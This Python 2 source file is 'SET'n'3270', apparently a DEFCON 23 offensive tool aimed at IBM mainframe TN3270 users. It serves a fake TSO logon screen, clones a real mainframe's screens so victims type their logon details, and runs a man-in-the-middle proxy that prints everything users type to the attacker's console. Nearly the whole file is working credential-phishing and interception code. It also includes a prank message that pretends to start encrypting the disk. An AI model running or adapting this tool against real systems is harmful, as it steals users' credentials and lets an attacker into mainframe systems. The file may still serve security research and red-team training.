#!/usr/bin/env python

import tn3270lib
import socket
import time
import ssl
import struct
import select
import SocketServer
import random
import os
import sys
import signal
import binascii
import argparse
from socket import *
import thread

try:
	from OpenSSL import SSL
	openssl_available = True
except ImportError:
	print "[!!] OpenSSL Library not available. SSL MitM will be disabled."
	openssl_available = False

class c:
    BLUE = '\033[94m'
    DARKBLUE = '\033[0;34m'
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[1;37m'
    ENDC = '\033[0m'
    DARKGREY = '\033[1;30m'
    

    def disable(self):
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
	self.DARKBLUE = ''
	self.PURPLE = ''
	seld.WHITE= ''
        self.RED = ''
        self.ENDC = ''


def send_tn(clientsock, data):
	clientsock.sendall(data)

def recv_tn(clientsock, timeout=100):
	rready,wready,err = select.select( [clientsock, ], [], [], timeout)
	#print len(rready)
	if len(rready): 
		data = clientsock.recv(1920)
	else:
		data = ''
	return data

def signal_handler(signal, frame):
        print c.ENDC+ "\nGAME OVER MAN!\n"
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

def fake_tso():
	tso_hex =("05c71140403c4040401140401de8"
			  "60606060606060606060606060606060" +
			  # Uncomment the following line, and then comment the line 
			  # below it for a real TSO logon screen. 
			  # C'mon son I wouldn't make it easy for you!
			  #"60606060606060606060606060606040e3e2d661c540d3d6c7d6d5406060" +
			  "6060606060606060606060606060409596e3e2d661c540d3d6c7d6d54060" +
			  "606060606060606060606060606060606060606060606060606060606060" +
			  "6060606011c1501de8" +
			  ########## Uncomment the following lines for a 'real' TSO screen
			  ########## And comment the lines between the '---------'
			  #"404040404040404040404040404040404040404040" +    
			  #"404040404040404040404040404040404040404040404040404040404040" +
			  #"404040404040404040404040404040404040404040404040404040404011" +
			  #----------- This adds 'DEFCON 23' to each TSO screen, lol ------			  
			  "606060606060606060606060606060606060606060"                   +
			  "606060606060606060606040c4c5c6c3d6d540f2f3406060606060606060" +
			  "606060606060606060606060606060606060606060606060606060604011" +
			  #----------------------------------------------------------------
			  "c2601de84040404040404040404040404040404040404040404040404040" +
			  "404040404040404040404040404040404040404040404040404040404040" +
			  "404040404040404040404040404040404040404040404040115b601de8d7" +
			  "c6f161d7c6f1f3407e7e6e40c885939740404040d7c6f361d7c6f1f5407e" +
			  "7e6e40d3968796868640404040d7c1f1407e7e6e40c1a3a38595a3899695" +
			  "40404040d7c1f2407e7e6e40d985a28896a6115cf01de8e896a4409481a8" +
			  "40998598a485a2a340a29785838986898340888593974089958696999481" +
			  "a38996954082a8408595a385998995874081407d6f7d408995408195a840" +
			  "8595a399a840868985938411c3f31de8c595a3859940d3d6c7d6d5409781" +
			  "99819485a38599a24082859396a67a11c4e31de8d9c1c3c640d3d6c7d6d5" +
			  "40978199819485a38599a27a11c6d21de85ce4a285998984404040407e7e" +
			  "7e6e11c6e21dc8404040404040401df011c8f21d6040d781a2a2a6969984" +
			  "40407e7e7e6e11c9c21d4c00000000000000001df0114df21d6040c18383" +
			  "a340d5948299407e7e7e6e114ec21dc80000000000000000000000000000" +
			  "00000000000000000000000000000000000000000000000000001df0114b" +
			  "d21d6040d79996838584a49985407e7e7e6e114be21dc800000000000000" +
			  "001df01150d21d6040e289a9854040404040407e7e7e6e1150e21dc80000" +
			  "00000000001df011d2f21d6040d78599869699944040407e7e7e6e11d3c2" +
			  "1dc80000001df0114cc21d6040c79996a49740c9848595a340407e7e7e6e" +
			  "114cd51dc800000000000000001df011c9e21d6040d585a640d781a2a2a6" +
			  "969984407e7e7e6e11c9f51d4c00000000000000001df011d7f31de8c595" +
			  "a38599408195407de27d408285869699854085818388409697a389969540" +
			  "8485a2899985844082859396a67a1d6011d9c71de84011d9c91dc8401df0" +
			  "60d596948189931d6011d9d71de84011d9d91dc8401df060d5969596a389" +
			  "83851d6011d9e81de84011d96a1dc8001df060d985839695958583a31d60" +
			  "11d97a1de84011d97c1dc8401df060d6c9c483819984401d6011d5d21d60" +
			  "40c39694948195844040407e7e7e6e11d5e21dc800000000000000000000" +
			  "000000000000000000000000000000000000000000000000000000000000" +
			  "0000000000000000000000000000000000000000000000000000000000"   +
			  "00000000000000000000001df011c7c21d7c40e285839381828593404040" +
			  "40407e7e7e6e11c7d51d7c40404040404040401df011c6e313")
	tso = binascii.unhexlify(tso_hex)
	return tso

def fake_goodbye(text="System Shutdown. Please connect to production LPAR."):
	goodbye = binascii.unhexlify("05c21d40") + text.decode('utf-8').encode('EBCDIC-CP-BE') + binascii.unhexlify("11c47f1d4013")
	return goodbye

def get_data(tn3270, data, buff):
	if len(data) <= 5:
		return
	if data[0] == tn3270lib.ENTER or data[5] == tn3270lib.ENTER: #did the client send an enter?
		tn3270.msg("AID Enter (0x7d) received!")
		if data[0] == tn3270lib.ENTER: #tn3270 mode
			i = 1
		else: #tn3270E mode
			i = 6
		cursor_location = data[i:i+2]
		i += 2
		while i <= len(data)-3: #the last two chars will be IAC SE (0xFFEF)
			tn3270.msg("Current Position: " + str(i) + " of " + str(len(data)-3))
			cp = data[i]
			if cp == tn3270lib.SBA:
				tn3270.msg("Set Buffer Address (SBA) 0x11")
				buff_addr = tn3270.DECODE_BADDR( struct.unpack(">B", data[i + 1])[0],
													struct.unpack(">B", data[i + 2])[0])
				tn3270.msg("Buffer Address: %r", buff_addr)
				tn3270.msg("Row: %r" , tn3270.BA_TO_ROW(buff_addr))
				tn3270.msg("Col: %r" , tn3270.BA_TO_COL(buff_addr))
				i += 3
			else:
				ascii_char = cp.decode('EBCDIC-CP-BE').encode('utf-8') 
				tn3270.msg("Inserting "+ ascii_char + " (%r) at the following location:", data[i])
				tn3270.msg("Row: %r" , tn3270.BA_TO_ROW(buff_addr))
				tn3270.msg("Col: %r" , tn3270.BA_TO_COL(buff_addr))
				tn3270.msg("Buffer Address: %r" , buff_addr)
				buff[buff_addr] = data[i]
				buff_addr = tn3270.INC_BUF_ADDR(buff_addr)
				i += 1
		j = 1
		pbuff = ''
		for line in buff:
			if line == "\00":
				pbuff += " "
			else:
				pbuff += line.decode('EBCDIC-CP-BE').encode('utf-8')
				j += 1

		tn3270.msg("Recieved %r items", len(pbuff.split()))

		j = 1
		for item in pbuff.split():
			print"[+] Line "+ str(j) +":", item 
			j += 1
	else:
		pbuff = ''

	return pbuff

def logo():
	print c.DARKBLUE
	logo = []
	logo.append("""
.::::::. .,::::::  ::::::::::::: :: ::.    :::.  ::  .::.      .:::.  ...:::::        
;;;`    ` ;;;;''''  ;;;;;;;;'''' ,' `;;;;,  `;;; ,' ;'`';;,   ,;'``;. '''``;;',;;,  
'[==/[[[[, [[cccc        [[          [[[[[. '[[      .n[[   ''  ,[['    .[' ,['  [n 
  '''    $ $$""''        $$          $$$ "Y$c$$     ``"$$$. .c$$P'    ,$$'  $$    $$
 88b    dP 888oo,__      88,         888    Y88     ,,o888"d88 _,oo,  888   Y8,  ,8"
  "YMmMY"  "''YUMMM     MMM         MMM     YM     YMMP"  MMMUP*"^^  MMM    "YmmP  """)
	logo.append("""
.sSSSSs.    .sSSSSs.       .sSSSSSSSSs.                  .sSSSSSSs.  .sSSSSs.    SSSSSSSSSs. .sSSSSs.   
SSSSSSSSSs. SSSSSSSSSs. .sSSSSSSSSSSSSSs. .sSSSs.  SSSSS `SSSS SSSSs `SSSS SSSs. SSSSSSSSSSS SSSSSSSSSs.
S SSS SSSS' S SSS SSSS' SSSSS S SSS SSSSS S SSS SS SSSSS       S SSS       SSSSS      S SSS  S SSS SSSSS
S  SS       S  SS       SSSSS S  SS SSSSS S  SS  `sSSSSS   .sS S  SS .sSSSsSSSS'     S  SS   S  SS SSSSS
`SSSSsSSSa. S..SSsss    `:S:' S..SS `:S:' S..SS    SSSSS  SSSSsS..SS S..SS          S..SS    S..SS\SSSSS
.sSSS SSSSS S:::SSSS          S:::S       S:::S    SSSSS   `:; S:::S S:::S SSSs.   S:::S     S:::S SSSSS
S;;;S SSSSS S;;;S             S;;;S       S;;;S    SSSSS       S;;;S S;;;S SSSSS  S;;;S      S;;;S SSSSS
S:::S SSSSS S:::S SSSSS       S:::S       S:::S    SSSSS .SSSS S:::S S:::S SSSSS S:::S       S:::S SSSSS
SSSSSsSSSSS SSSSSsSS;:'       SSSSS       SSSSS    SSSSS `:;SSsSSSSS SSSSSsSSSSS SSSSS       `:;SSsSS;:'""")
	logo.append("""
                               ##    #           ##                                      
                              ##     ##         ##                                       
    #### ######## ########   ##      ###  ##   ##      #######  #######  #######  #######
   ###               ###             #### ##                ##       ##       ##  ##   ##
   ###    #######    ###             #######             #####  #######       ##  ##   ##
   ###    ###        ###             ### ###                ##  ###           ##  ##   ##
#####     #######    ###             ###  ##           #######  #######       ##  #######
                                           #                                  ##         """)
	logo.append("""
  ______  _______  _______  _         _  ______   ______   _______   _____  
 / _____)(_______)(_______)( )       ( )(_____ \ (_____ \ (_______) (_____) 
( (____   _____       _    |/  ____  |/  _____) )  ____) )      _   _  __ _ 
 \____ \ |  ___)     | |      |  _ \    (_____ (  / ____/      / ) | |/ /| |
 _____) )| |_____    | |      | | | |    _____) )| (_____     / /  |   /_| |
(______/ |_______)   |_|      |_| |_|   (______/ |_______)   (_/    \_____/ """)
	logo.append("""
MP''''''`MM MM''''''''`M M''''''''M d8          d8 d8888b. d8888b. d88888P  a8888a 
M  mmmmm..M MM  mmmmmmmM Mmmm  mmmM 88          88     `88     `88     d8' d8' ..8b
M.      `YM M`      MMMM MMMM  MMMM .P 88d888b. .P  aaad8' .aaadP'    d8'  88 .P 88
MMMMMMM.  M MM  MMMMMMMM MMMM  MMMM    88'  `88        `88 88'       d8'   88 d' 88
M. .MMM'  M MM  MMMMMMMM MMMM  MMMM    88    88        .88 88.      d8'    Y8'' .8P
Mb.     .dM MM        .M MMMM  MMMM    dP    dP    d88888P Y88888P d8'      Y8888P 
MMMMMMMMMMM MMMMMMMMMMMM MMMMMMMMMM                                                """)
	logo.append("""
  _______   _______   _______   __           __   _______   _______   _______   _______ 
 |   _   | |   _   | |       | |  | .-----. |  | |   _   | |       | |   _   | |   _   |
 |   1___| |.  1___| |.|   | |  |_| |     |  |_| |___|   | |___|   | |___|   | |.  |   |
 |____   | |.  __)_  `-|.  |-'      |__|__|       _(__   |  /  ___/     /   /  |.  |   |
 |:  1   | |:  1   |   |:  |                     |:  1   | |:  1  \    |   |   |:  1   |
 |::.. . | |::.. . |   |::.|                     |::.. . | |::.. . |   |   |   |::.. . |
 `-------' `-------'   `---'                     `-------' `-------'   `---'   `-------'""")
	print logo[random.randrange(0, len(logo) - 1)], "\n"
	print c.ENDC

###### Special, just for DEFCON
def printer(s):
    for c in s:
	sys.stdout.write( c )
        sys.stdout.flush()
        time.sleep(random.uniform(0, 0.15))
    print "\n",

def printv(str):
	""" Prints str if we're in verbose mode """
	if args.verbose:
		print str

def get_all(sox):
	#terrible, I know	
	data = ''
	while True:
		d = recv_tn(sox,1)
		if not d:
			break
		else:
			data += d
	return data


def proxy_handler(clientsock, target, port, tn3270, delay=0.001):
	# passthrough proxy
	timeout = 3
	if args.verbose:
		print "[+] Proxy Started. Sending all packets to", target
		print "[+] Connecting to", target, ":", port
	try:
		print "[+] Trying SSL"
		non_ssl = socket(AF_INET, SOCK_STREAM)
		ssl_sock = ssl.wrap_socket(sock=non_ssl,cert_reqs=ssl.CERT_NONE)
		#ssl_sock.settimeout(timeout)
		ssl_sock.connect((target,port))
		serversock = ssl_sock
	except ssl.SSLError, e:
		ssl_sock.close()
		try:
			print "[+] Using Plaintext"
			sock = socket(AF_INET, SOCK_STREAM)
			sock.settimeout(timeout)
			sock.connect((target,port))
			serversock = sock
		except Exception, e:
			print '[!] Socket Error:', e
			return False
	except Exception, e:
		print '[!] Error:', e
		return False
	print "[+] Connection complete. MitM Ahoy!"
	#serversock = socket(AF_INET, SOCK_STREAM)
	#serversock.connect((target, port))
	#serversock.settimeout(5)
	channel = {}
	connections = []
	connections.append(clientsock)
	connections.append(serversock)
	channel[clientsock] = serversock
	channel[serversock] = clientsock
	while 1:
		ssl_you_bastard = False
		time.sleep(delay)
		inputready, outputready, exceptready = select.select(connections, [], [], 5)
		for s in inputready:
			s.settimeout(10)
			#s.setblocking(0)
			try:
				data = s.recv(1920)
			except SSL.WantReadError:
				ssl_you_bastard = True
				data = ''
			except SSL.ZeroReturnError:
				ssl_you_bastard = False
				data = ''
			if len(data) == 0 and not ssl_you_bastard:
				print '[+] Disconnected', s.getpeername()
				connections.remove(s)
				connections.remove(channel[s])
				out = channel[s]
				# close the connection with client
				channel[out].close()  # equivalent to do s.close()
				# close the connection with remote server
				channel[s].close()
				# delete both objects from channel dict
				del channel[out]
				del channel[s]
				break
			else:
				buff = list("\0" * 1920)
				pbuff = get_data(tn3270, data, buff)
				channel[s].sendall(data)





def handler(clientsock,addr,tn3270, screen, cmd_tracker, commands=False):
	#Begin tn3270 negotiation:
	send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options['TN3270'])
	tn3270.msg("Sending: IAC DO TN3270")
	data  = recv_tn(clientsock)
	if data == tn3270lib.IAC + tn3270lib.WILL + tn3270lib.options['TN3270']:
		tn3270.msg("Received Will TN3270, sending IAC DONT TN3270")
		send_tn(clientsock, tn3270lib.IAC + tn3270lib.DONT + tn3270lib.options['TN3270'])
		data  = recv_tn(clientsock)

	if data != tn3270lib.IAC + tn3270lib.WONT + tn3270lib.options['TN3270']:
		#We don't support 3270E and your client is messed up, exiting
		tn3270.msg("Didn't negotiate tn3270 telnet options, quitting!")
		clientsock.close()
		return

	send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options['TTYPE'])
	tn3270.msg("Sending: IAC DO TTYPE")
	data  = recv_tn(clientsock)
	send_tn(clientsock, tn3270lib.IAC  + 
		                tn3270lib.SB   + 
		                tn3270lib.options['TTYPE'] +
		                tn3270lib.SEND +
		                tn3270lib.IAC  +
		                tn3270lib.SE  )
	data  = recv_tn(clientsock)
	tn3270.msg("Sending: IAC DO EOR")
	send_tn(clientsock, tn3270lib.IAC + tn3270lib.DO + tn3270lib.options['EOR'])
	data  = recv_tn(clientsock)
	tn3270.msg("Sending: IAC WILL EOR; IAC DO BINARY; IAC WILL BINARY")
	send_tn(clientsock, tn3270lib.IAC  + 
		                tn3270lib.WILL + 
		                tn3270lib.options['EOR'] +
		                tn3270lib.IAC  +
		                tn3270lib.DO   +
		                tn3270lib.options['BINARY'] +
		                tn3270lib.IAC  +
		                tn3270lib.WILL +
		                tn3270lib.options['BINARY']  )

	
	#clientsock.settimeout(1)
	#clientsock.setblocking(0)
	data = get_all(clientsock)
	#while True:
		#try:
	#	data = recv_tn(clientsock,1)
	#	if not data:
	#		break

	buff = list("\0" * 1920)
	buff_addr = 0
	current_screen = 0
	timing = 0



	send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
	# First we wait:
	data  = recv_tn(clientsock)
	data  += get_all(clientsock)
	not_done = True
	while not_done:

		if data == '':
			break

		current_screen += 1

		if commands is not False:
			print commands
			if timing >= len(commands):
				commands = False
				continue
			for current_command in commands:
				timing += 1
				buff = list("\0" * 1920)
				pbuff = get_data(tn3270, data, buff)
				try:
					command_received = pbuff.split()[0]
				except (IndexError, AttributeError), e:
					command_received = "AID"

				items_to_next_input = cmd_tracker[current_command]

				if command_received == current_command or current_command == "*":
					if args.verbose: 
						print "[+] Current Command:", current_command,"Command Recieved:" , command_received
						print "[+] Current Screen:", current_screen, "items to next input:", items_to_next_input
						print "[+] Command Tracker:", cmd_tracker
					while current_screen < items_to_next_input:
						send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
						current_screen += 1
					#clear the input buffer
					data = get_all(clientsock)
				
					send_tn(clientsock, screen[current_screen] + tn3270lib.IAC + tn3270lib.TN_EOR)
					data  = get_all(clientsock)
				else:
					print "[+] Displaying Dummy Screen"
					send_tn(clientsock, fake_goodbye("ERROR: Feature currently not enalbled.") + tn3270lib.IAC + tn3270lib.TN_EOR)
					print "[+] Sleeping 5"
					time.sleep(5)
					not_done = False
					break
		else:
			#if not_done:
			buff = list("\0" * 1920)
			pbuff = get_data(tn3270, data, buff)
			#print tn3270.hexdump(pbuff)
			print "[+] Displaying Dummy Screen"
			send_tn(clientsock, fake_goodbye(args.goodbye) + tn3270lib.IAC + tn3270lib.TN_EOR)
			print "[+] Sleeping 5"
			time.sleep(5)
			break

		#data  = recv_tn(clientsock)

	clientsock.close()
	print "[+] Connection Closed", addr
	
	#tn3270.msg("%r Closed Connection", addr) #log on console



#start argument parser
parser = argparse.ArgumentParser(description='SET\'n\'3270: The Mainframe TN3270 Social Engineering Tool.\n\n This tool can be used in three ways:\n 1) Create a fake TSO logon screen as a honey pot. \n2) Mirror a live mainframe, even taking commands you expect users to enter.\n3) MITM a connection and output the input to the console.')
parser.add_argument('target',help='The z/OS Mainframe TN3270 Server IP or Hostname', nargs='?')
parser.add_argument('-p','--port',help='The TN3270 server port. Default is 23', dest='port', default=23, type=int)
parser.add_argument('--passthru', help='Operates as a proxy', dest='proxy', action='store_true',default=False)
parser.add_argument('-c','--commands',help='Typed commands you want to send/expect to receive. Multiple commands can be seperated by a semi-colon \';\'. e.g: ./SETn3270.py target.com --commands "logon;netview;tso"', dest='commands', default=False)
parser.add_argument('-g','--goodbye',help='Message disaplayed on targets screen when at the end', dest='goodbye', default="System Shutdown. Please connect to production LPAR.")
# TODO: Add custom screens. For now just replace the hex in the fake_tso() function
#parser.add_argument('-s', '--screen', help='A file containing a screen you want to display. Format must be single line all hex chats, see tso.txt for an example.',dest='screen', default=False)
parser.add_argument('--ssl',help='Force SSL connections from the client.',default=False,dest='ssl',action='store_true')
parser.add_argument('-v','--verbose',help='Be verbose',default=False,dest='verbose',action='store_true')
parser.add_argument('-d','--debug',help='Show debug information. Displays A LOT of information',default=False,dest='debug',action='store_true')
parser.add_argument('--altport',help='Define an alternate port to accept connections to. Note: Most tn3270 clients don\'t make it easy to change ports so don\'t expect your targets to do so',dest='altport',default=False, type=int)
parser.add_argument('--nossl',help='Disable server side SSL. Note: Most clients will fail if you do not have SSL enabled when they expect SSL connections.',default=False,dest='nossl',action='store_true' )
parser.add_argument('--defcon',help='Disable Warning',default=False,dest='defcon',action='store_true') #LOL!
args = parser.parse_args()

# ---------------------------------
#                                  |
#                 -----------      |
#                | DEFCON    |     |
#    SoF ------> |   Secret  | <---     
#                |     Sauce |
#                 ----------- 

if os.geteuid() == 0 and not args.defcon:
	print c.YELLOW + "[!!] DEFCON 23:"
	printer("[!!] OMG!! Did you just run a program, from the DEFCON CD\n[!!] WITH ROOT PRIVELGES?")
	print c.RED, 
	printer("[!!] What were you thinking?\n[!!] Begining Hard Drive Encryption NOW!")
	printer("     ---------------------------------")
	time.sleep(1)
	print c.GREEN,
	printer("[!!] Loooool. Gotchya! Just be more careful in the future!") 
	printer("(disable this warning next time with --defcon)")
	time.sleep(2)
	print c.ENDC


logo()

commands = False
target_ssl = False
cmd_tracker = {}

print '[+] Starting SET\'n\'3270'

# First we need an object:
tn = tn3270lib.TN3270()

if args.debug:
	tn.set_debuglevel(1)

if args.proxy:
	# setup the proxy aspect
	if args.target is None:
		print c.RED + "[+] Passthrough mode selected but no target entered. Exiting!" + c.ENDC
		sys.exit(-1)
	
	print "[+] Starting passthrough mode on port", 
	if not args.altport: 
		print args.port
	else:
		print args.altport
	
	if args.ssl and openssl_available:
		print "[+] Creating SSL Socket"
		tnssl = SSL.Context(SSL.SSLv23_METHOD)
		tnssl.use_privatekey_file('setn3270_key')
		tnssl.use_certificate_file('setn3270_cert')
		tnsock = socket(AF_INET, SOCK_STREAM)
		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		tnsock = SSL.Connection(tnssl, tnsock)
	else:
		print "[+] Creating Plaintext Socket"
		tnsock = socket(AF_INET, SOCK_STREAM)
		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		print "[+] Creating SSL Passthrough"
	#print "[+] Starting passthrough mode on port", args.port
	if not args.altport:
		ADDR = ('', args.port)
	else:
		ADDR = ('', args.altport)
	#tnsock.settimeout(5)
	tnsock.bind(ADDR)
	tnsock.listen(5)

	print "[+] Waiting for Incomming Connections on port", args.port
	while 1:
		clientsock, addr = tnsock.accept()
		print '[+] Connection Recieved from:', addr
		thread.start_new_thread(proxy_handler, (clientsock, args.target, args.port, tn ))
else:
	# Now we either strip a target mainframe 
	# or we display a default TSO logon screen
	if args.target is not None:
		print "[+] Connecting to ", args.target, ":", args.port
		if not tn.initiate(args.target,args.port):
			print "[!] Could not connect to", args.target, ":", args.port
			sys.exit(-1)
		if args.verbose: 
			print "[+] Current screen is:"
			tn.print_screen()
		if args.commands is not False:
			commands = args.commands.split(';')
			print "[+] Sending Commands:", 
			print commands
			for command in commands:
				if args.verbose:
					print "[+] Sending Command:", command
				if command == "*":
					tn.send_cursor('fake')
				else:
					tn.send_cursor(command)
				
				tn.get_all_data()
				cmd_tracker[command] = len(tn.raw_screen_buffer()) - 1
				if args.verbose: 
					print "[+] Current screen is:"
					tn.print_screen()

		print "[+] Mainframe Screen Copy Complete"
		if args.verbose:
			print "[+] Closing Connection to Mainframe"
		tn.disconnect()
		screen = tn.raw_screen_buffer()
		target_ssl = tn.is_ssl()
	else:
		print "[+] No target specified. Creating fake TSO screen on port",
		if not args.altport:
			print args.port
		else:
			print args.altport
		screen = []
		screen.insert(0,fake_tso())

	if not args.altport:
		ADDR = ('', args.port)
	else:
		ADDR = ('', args.altport)
	
	if (target_ssl or args.ssl) and openssl_available:
		#do ssl stuff
		print "[+] Creating SSL Socket"
		tnssl = SSL.Context(SSL.SSLv23_METHOD)
		tnssl.use_privatekey_file('setn3270_key')
		tnssl.use_certificate_file('setn3270_cert')
		tnsock = socket(AF_INET, SOCK_STREAM)
		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		tnsock = SSL.Connection(tnssl, tnsock)
		#tnsock.setblocking()
	else:
		print "[+] Creating Plaintext Socket"
		tnsock = socket(AF_INET, SOCK_STREAM)
		tnsock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

	tnsock.bind(ADDR)
	tnsock.listen(5)

	print "[+] Waiting for Incomming Connections on port", 
	if not args.altport: 
		print args.port
	else:
		print args.altport
	while 1:
		clientsock, addr = tnsock.accept()
		print '[+] Connection Recieved from:', addr
		thread.start_new_thread(handler, (clientsock, addr, tn, screen, cmd_tracker, commands  ))







